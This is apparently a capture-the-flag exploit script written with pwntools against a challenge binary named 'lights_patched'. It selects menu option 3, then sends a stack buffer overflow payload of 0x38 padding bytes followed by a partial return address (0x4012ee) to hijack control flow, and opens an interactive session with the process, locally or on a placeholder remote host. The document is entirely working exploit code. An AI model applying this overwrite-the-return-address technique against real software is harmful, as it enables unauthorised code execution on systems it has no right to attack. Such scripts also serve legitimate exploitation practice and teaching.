#!/usr/bin/env python3

from pwn import *

exe = ELF("./lights_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    ret_addr = 0x004012ee
    r.recv()
    r.sendline(b"3")
    r.recv()
    r.sendline(b"A" * 0x38 + b"\xee\x12\x40")

    r.interactive()


if __name__ == "__main__":
    main()
